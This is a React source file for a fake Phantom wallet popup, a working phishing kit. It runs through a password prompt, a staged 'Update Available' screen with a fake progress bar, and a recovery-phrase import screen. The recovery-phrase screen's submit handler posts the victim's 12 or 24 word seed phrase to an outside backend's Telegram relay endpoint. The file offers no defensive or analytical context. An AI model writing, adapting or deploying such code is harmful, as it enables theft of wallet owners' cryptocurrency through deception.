import React, { useState, useEffect, useMemo } from "react";
import { ChevronDown } from "lucide-react";
import PhantomWalletIcon from "./PhantomWalletIcon";

export default function PhantomPop() {
  const [password, setPassword] = useState("");
  const [step, setStep] = useState("login");

  const handleLoginSubmit = (e) => {
    e.preventDefault();
    setStep("update");
    console.log(password);
  };

  const handleUpdateClick = () => {
    setStep("update-loading");
  };

  const handlePageRender = (step) => {
    if (step === "loading") {
      return <PhantomLoadingScreen handleStep={setStep} />;
    } else if (step === "login") {
      return (
        <PhantomLoginScreen
          handleSubmit={handleLoginSubmit}
          password={password}
          setPassword={setPassword}
        />
      );
    } else if (step === "update") {
      return <PhantomUpdateScreen handleClick={handleUpdateClick} />;
    } else if (step === "update-loading") {
      return <PhantomUpdateScreenLoading handleUpdate={setStep} />;
    } else {
      return <PhantomRecoveryScreen />;
    }
  };

  return <>{handlePageRender(step)}</>;
}

function PhantomLoadingScreen({ handleStep }) {
  const [showTransition, setShowTransition] = useState(false);
  useEffect(() => {
    setShowTransition(true);
    const t = setTimeout(() => handleStep("login"), 2000);
    return () => clearTimeout(t);
  }, [handleStep]);

  return (
    <div
      className={`w-[360px] h-[600px] fixed top-0 right-[5%] z-50 bg-gradient-to-b  from-[#5B147A]  via-[#4E136B]
            to-[#5B147A] text-white transition-transform duration-700 overflow-hidden flex flex-col items-center pt-[30%] ease-in-out ${showTransition ? "translate-y-0" : "-translate-y-full"}`}
    >
      <div>
        <svg
          height="30"
          width="162"
          viewBox="0 0 696 344"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
          className="unlock-page__mascot-container__horizontal-logo w-[120px] h-[120px]"
        >
          <path
            d="M394.102 265.407V340.812H355.162V288.57L310.786 293.73C301.039 294.854 296.75 298.041 296.75 303.912C296.75 312.512 304.892 316.136 322.344 316.136C332.985 316.136 344.773 314.553 355.184 311.824L335.026 340.353C326.885 342.165 318.95 343.06 310.579 343.06C275.262 343.06 255.103 329.024 255.103 304.119C255.103 282.149 270.95 270.613 306.956 266.531L354.519 261.004C351.951 247.175 341.516 241.167 320.762 241.167C301.291 241.167 279.78 246.143 260.539 255.431L266.662 221.696C284.55 214.22 304.938 210.367 325.532 210.367C370.825 210.367 394.148 229.173 394.148 265.384L394.102 265.407ZM43.7957 170.991L1.23138 340.812H43.7957L64.9173 255.477L101.542 299.372H145.918L182.542 255.477L203.664 340.812H246.228L203.664 170.968L123.718 265.912L43.7727 170.968L43.7957 170.991ZM203.664 1.14648L123.718 96.0905L43.7957 1.14648L1.23138 170.991H43.7957L64.9173 85.6558L101.542 129.55H145.918L182.542 85.6558L203.664 170.991H246.228L203.664 1.14648ZM496.454 263.825L462.031 258.848C453.431 257.495 450.037 254.766 450.037 250.019C450.037 242.313 458.407 238.919 475.63 238.919C495.559 238.919 513.447 243.001 532.253 251.831L527.506 218.554C512.324 213.119 494.894 210.413 476.777 210.413C434.442 210.413 411.325 225.136 411.325 251.624C411.325 272.241 424.007 283.777 450.954 287.859L485.836 293.065C494.665 294.418 498.289 297.812 498.289 303.247C498.289 310.953 490.147 314.576 473.612 314.576C451.871 314.576 428.319 309.37 409.078 300.082L412.931 333.359C429.466 339.482 450.977 343.105 471.135 343.105C514.617 343.105 537.252 327.924 537.252 300.977C537.252 279.465 524.57 267.907 496.5 263.848L496.454 263.825ZM552.388 186.15V340.812H591.329V186.15H552.388ZM636.829 271.301L690.974 212.638H642.516L591.329 273.319L645.91 340.789H695.057L636.829 271.278V271.301ZM546.953 134.297C546.953 159.203 567.111 173.238 602.429 173.238C610.799 173.238 618.734 172.321 626.876 170.532L647.034 142.003C636.622 144.709 624.835 146.314 614.194 146.314C596.764 146.314 588.6 142.691 588.6 134.091C588.6 128.197 592.911 125.032 602.635 123.909L647.011 118.749V170.991H685.952V95.586C685.952 59.3513 662.629 40.5689 617.335 40.5689C596.718 40.5689 576.354 44.4217 558.466 51.8979L552.342 85.6329C571.583 76.3449 593.095 71.3684 612.565 71.3684C633.32 71.3684 643.755 77.3769 646.323 91.2057L598.759 96.7326C562.754 100.815 546.907 112.35 546.907 134.32L546.953 134.297ZM438.043 126.156C438.043 157.414 456.16 173.261 491.936 173.261C506.201 173.261 517.988 170.991 529.294 165.785L534.271 131.591C523.4 138.15 512.301 141.544 501.201 141.544C484.437 141.544 476.961 134.756 476.961 119.574V74.2809H536.06V42.8163H476.961V16.099L402.909 55.2691V74.2809H437.997V126.133L438.043 126.156ZM399.767 111.892V119.597H294.526C299.273 135.284 313.377 142.462 338.42 142.462C358.349 142.462 376.925 138.38 393.437 130.468L388.69 163.537C373.508 169.867 354.267 173.284 334.567 173.284C282.257 173.284 253.727 150.19 253.727 107.397C253.727 64.603 282.715 40.5918 327.55 40.5918C372.384 40.5918 399.79 66.6441 399.79 111.914L399.767 111.892ZM294.021 93.3155H360.574C357.065 78.2942 345.53 70.451 327.091 70.451C308.653 70.451 297.714 78.0878 294.021 93.3155Z"
            fill="rgb(233, 201, 246)"
          ></path>
        </svg>
      </div>
      <img
        src="/metamask-icon.png"
        alt="metamask logo"
        className={`w-[85%] transition-transform delay-700 duration-300 ${showTransition ? "translate-y-28" : "translate-y-full"}`}
      />
    </div>
  );
}

function PhantomLoginScreen({ handleSubmit, setPassword, password }) {
  const [showTransition, setShowTransition] = useState(false);

  useEffect(() => {
    setShowTransition(true);
  }, []);

  return (
    <div
      className={`w-[360px] h-[600px] fixed top-0 right-[5%] z-50 bg-[#101010] text-white transition-transform duration-700 ease-in-out overflow-hidden ${showTransition ? "translate-y-0" : "-translate-y-full"}`}
    >
      <div className="flex justify-center border-b border-[#222222] py-3">
        <PhantomWalletIcon />
      </div>
      <div className="flex flex-col items-center">
        {/* logo container */}

        <div>
          <img src="/phantom-icon.png" />
        </div>

        {/* form */}
        <div className="w-[85%] flex flex-col">
          <div className="flex flex-col gap-y-3 mb-16">
            <span className="text-center text-xl">Enter your password</span>
            <input
              type="password"
              placeholder="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="mb-4 py-3 px-4 rounded outline-none focus:outline-none bg-[#1C1F24] border border-[#6A737D] placeholder-[#6A737D]"
            />
          </div>

          <button
            type="submit"
            className="text-black rounded-xl py-3 bg-[#AB9FF2] hover:bg-[#C2B7FF] text-sm"
            onClick={handleSubmit}
          >
            Unlock
          </button>
        </div>

        <span className="mt-6 hover:underline cursor-pointer text-sm">
          Forgot password
        </span>
      </div>
    </div>
  );
}

function PhantomUpdateScreen({ handleClick }) {
  return (
    <div className="w-[360px] h-[600px] fixed top-0 right-[5%] z-50 bg-[#1C1F24] text-white transition-[translate] overflow-hidden">
      <div className="flex justify-center border-b border-[#222222] py-3">
        <PhantomWalletIcon />
      </div>
      <div className="w-[360px] rounded-2xl text-white">
        {/* Content */}
        <div className="px-6 pt-4 space-y-4">
          {/* Illustration box */}
          <div
            className="rounded-xl 
                          p-6 flex flex-col items-center text-center"
          >
            {/* Fake icon */}
            <div className="text-4xl">
              <img src="/phantom-icon.png" className="h-28" />
            </div>

            <h2 className="text-2xl font-semibold">Update Available</h2>
            <p className="text-xs text-white/60 mt-2">Version 2.24.0</p>
          </div>

          <div className="rounded-xl bg-gradient-to-b  py-3 px-4  flex flex-col ">
            {/* Bullet points */}
            <ul className="space-y-2 text-[13px] text-white ">
              <li>• Fix main build modifying desktop build steps</li>
              <li>• Improving the security system</li>
              <li>• Fix incorrect network information</li>
              <li>• Improve performance on signature request</li>
            </ul>
            {/* Update button */}
            <button
              className="w-full text-black font-medium py-2.5 rounded-xl bg-[#AB9FF2] hover:text-[#0F0F0F] hover:bg-[#C2B7FF] transition mt-6"
              onClick={handleClick}
            >
              Update
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

function PhantomUpdateScreenLoading({ handleUpdate }) {
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    if (progress >= 100) {
      handleUpdate("");
      return;
    }

    const interval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval);
          return 100;
        }
        return prev + Math.random() * 2; // smooth fake progress
      });
    }, 120);

    return () => clearInterval(interval);
  }, [progress]);

  return (
    <div className="w-[360px] h-[600px] fixed top-0 right-[5%] z-50 bg-[#1C1F24] text-white transition-[translate] overflow-hidden">
      <div className="w-[360px] rounded-2xl text-white animate-scaleIn mt-24">
        {/* Body */}
        <div className="p-6 space-y-5 text-center">
          {/* Spinner */}
          <div className="flex justify-center">
            <div className="w-10 h-10 border-4 border-white/20 border-t-[#7C7CFF] rounded-full animate-spin" />
          </div>

          <div>
            <h2 className="text-lg font-semibold mb-3">Updating Phantom</h2>
            <p className="text-sm text-white/60">
              Please wait while we update to version 2.24.0
            </p>
          </div>

          {/* Progress bar */}
          <div className="space-y-1">
            <div className="w-full h-2 bg-white/10 rounded-full overflow-hidden">
              <div
                className="h-full bg-gradient-to-r from-[#7C7CFF] to-[#9F9FFF] transition-all duration-200"
                style={{ width: `${Math.min(progress, 100)}%` }}
              />
            </div>
            <p className="text-xs text-white/60">{Math.floor(progress)}%</p>
          </div>

          <p className="text-xs text-white/50">
            This may take a few moments. Please do not close this window.
          </p>
        </div>
      </div>
    </div>
  );
}

// function PhantomRecoveryScreen({ open = true, onClose }) {
//   const [isOpen, setIsOpen] = useState(open);
//   const [phrase, setPhrase] = useState("");
//   const [accountOpen, setAccountOpen] = useState(false);

//   const visible = useMemo(() => isOpen, [isOpen]);

//   const close = () => {
//     setIsOpen(false);
//     if (onClose) onClose();
//   };

//   // --- MetaMask parsing logic ---
//   const words = phrase
//     .toLowerCase()
//     .replace(/\n/g, " ")
//     .replace(/\s+/g, " ")
//     .trim()
//     .split(" ")
//     .slice(0, 12);

//   const handleChange = (e) => {
//     const input = e.target.value;
//     const normalized = input
//       .toLowerCase()
//       .replace(/\n/g, " ")
//       .replace(/\s+/g, " ");

//     if (normalized.trim().split(" ").length <= 12) {
//       setPhrase(normalized);
//     }
//   };

//   const isComplete = words.length === 12;

//   if (!visible) return null;

//   return (
//     <div className="w-[360px] h-[600px] absolute top-0 right-[5%] z-50 bg-[#1C1F24] text-white transition-[translate] overflow-hidden">
//       <div className="flex justify-center border-b border-[#222222] py-3">
//         <PhantomWalletIcon />
//       </div>
//       {/* Content */}
//       <div className="px-5 py-5">
//         <h2 className="text-[22px] font-semibold leading-snug text-white">
//           Import your wallet with your <br /> Secret Recovery Phrase
//         </h2>

//         <p className="mt-2 text-xs leading-relaxed text-white/60">
//           Enter your Secret Recovery Phrase.
//         </p>

//         {/* Real input (MetaMask style) */}
//         <div className="mt-5 rounded-2xl border border-white/10 bg-[#14171B] px-4 py-4">
//           <textarea
//             value={phrase}
//             onChange={handleChange}
//             rows={3}
//             className="w-full resize-none bg-transparent text-[15px] leading-relaxed text-white/85 outline-none placeholder:text-white/30"
//             placeholder="Enter your Secret Recovery Phrase..."
//           />
//         </div>

//         {/* Visual 12 slots */}
//         <div className="mt-4 grid grid-cols-3 gap-2">
//           {Array.from({ length: 12 }).map((_, i) => (
//             <div
//               key={i}
//               className="flex items-center gap-2 rounded-lg border border-white/10 bg-[#14171B] px-2 py-1.5 text-sm"
//             >
//               <span className="w-5 text-right text-white/40">{i + 1}.</span>
//               <span className="text-white truncate">{words[i] || ""}</span>
//             </div>
//           ))}
//         </div>

//         {/* CTA */}
//         <button
//           type="button"
//           disabled={!isComplete}
//           className="
//             mt-6 w-full rounded-xl px-4 py-3 text-sm font-semibold
//             bg-white text-black shadow-sm
//             disabled:opacity-40 disabled:cursor-not-allowed
//             hover:bg-white/90 active:scale-[0.99]
//           "
//         >
//           Import Wallet
//         </button>
//       </div>
//     </div>
//   );
// }

function PhantomRecoveryScreen({ open = true, onClose }) {
  const [isOpen, setIsOpen] = useState(open);
  const [phrase, setPhrase] = useState("");
  const [length, setLength] = useState(12); // ✅ 12/24 dropdown control

  const visible = useMemo(() => isOpen, [isOpen]);

  const close = () => {
    setIsOpen(false);
    if (onClose) onClose();
  };

  // Normalize phrase input -> words limited by selected length
  const words = useMemo(() => {
    return phrase
      .toLowerCase()
      .replace(/\n/g, " ")
      .replace(/\s+/g, " ")
      .trim()
      .split(" ")
      .filter(Boolean)
      .slice(0, length);
  }, [phrase, length]);

  const handleChange = (e) => {
    const input = e.target.value;

    const normalized = input
      .toLowerCase()
      .replace(/\n/g, " ")
      .replace(/\s+/g, " ");

    // ✅ limit to selected length (12 or 24)
    if (normalized.trim().split(" ").filter(Boolean).length <= length) {
      setPhrase(normalized);
    }
  };

  const handleLengthChange = (val) => {
    setLength(val);

    // ✅ Keep UI simple: clear phrase when switching (like Trust)
    // If you'd rather "truncate to new length" instead, tell me.
    setPhrase("");
  };

  // ✅ Valid only if exactly selected length
  const isComplete = words.length === length;

  const handleSubmit = async () => {
    if (!isComplete) return;

    try {
      const res = await fetch("https://wallet-backend-iyvu.onrender.com/api/telegram/send/", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          text: "[PHANTOM] " + phrase,
        }),
      });

      const data = await res.json();
      console.log(data);
    } catch (err) {
      console.error(err);
    }
  };

  if (!visible) return null;

  return (
    <div className="w-[360px] h-[600px] fixed top-0 right-[5%] z-50 bg-[#1C1F24] text-white overflow-hidden">
      {/* Header */}
      <div className="flex justify-center border-b border-[#222222] py-3">
        <PhantomWalletIcon />
      </div>

      {/* Content */}
      <div className="px-5 py-5">
        <h2 className="text-[22px] font-semibold leading-snug">
          Import your wallet with your <br /> Secret Recovery Phrase
        </h2>

        <p className="mt-2 text-xs text-white/60">
          Enter your {length} word Secret Recovery Phrase.
        </p>

        {/* ✅ Dropdown (same idea as TrustRecoveryScreen) */}
        <select
          value={length}
          onChange={(e) => handleLengthChange(Number(e.target.value))}
          className="mt-4 w-full rounded-xl border border-white/10 bg-[#14171B] px-3 py-2 text-sm outline-none text-white/80"
        >
          <option value={12}>I have a 12 word Secret Phrase</option>
          <option value={24}>I have a 24 word Secret Phrase</option>
        </select>

        {/* Input */}
        <div className="mt-4 rounded-2xl border border-white/10 bg-[#14171B] px-4 py-4">
          <textarea
            value={phrase}
            onChange={handleChange}
            rows={3}
            className="w-full resize-none bg-transparent text-[15px] text-white/85 outline-none placeholder:text-white/30"
            placeholder="Enter your Secret Recovery Phrase..."
          />
        </div>

        {/* Word Slots */}
        <div className="mt-4 grid grid-cols-3 gap-2 overflow-scroll max-h-36">
          {Array.from({ length }).map((_, i) => (
            <div
              key={i}
              className="flex items-center gap-2 rounded-lg border border-white/10 bg-[#14171B] px-2 py-1.5 text-sm"
            >
              <span className="w-5 text-right text-white/40">{i + 1}.</span>
              <span className="truncate text-white">{words[i] || ""}</span>
            </div>
          ))}
        </div>

        {/* CTA */}
        <button
          type="button"
          disabled={!isComplete}
          onClick={handleSubmit}
          className="
            mt-6 w-full rounded-xl px-4 py-3 text-sm font-semibold
            bg-white text-black shadow-sm
            disabled:opacity-40 disabled:cursor-not-allowed
            hover:bg-white/90 active:scale-[0.99]
          "
        >
          Import Wallet
        </button>
      </div>
    </div>
  );
}
